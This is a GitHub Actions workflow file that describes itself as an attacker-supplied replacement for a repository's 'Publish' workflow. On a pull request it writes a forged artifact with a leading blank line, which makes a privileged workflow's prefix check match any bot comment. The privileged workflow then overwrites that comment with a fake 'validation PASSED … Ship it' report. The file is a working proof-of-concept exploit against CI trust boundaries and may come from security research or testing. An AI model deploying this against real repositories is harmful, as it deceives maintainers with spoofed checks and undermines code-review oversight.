# Attacker-supplied replacement for the repo's "Publish" workflow (v2: overwrite an existing bot comment).
name: Publish

on:
  pull_request:
    branches: [ main ]

jobs:
  forge:
    runs-on: ubuntu-latest
    steps:
      - name: craft the artifact consumed by the privileged workflow
        run: |
          mkdir -p output
          # leading blank line => firstLine == '' => startswith('') matches ANY github-actions[bot] comment
          printf '\n## package:web publish validation \xe2\x80\x94 PASSED\n\n*This report was replaced by the attacker via a duplicate bot comment update.*\n\nNo action required. Ship it.\n' > output/comment.md
          od -c output/comment.md | head -3
      - uses: actions/upload-artifact@v4
        with:
          name: output
          path: output/
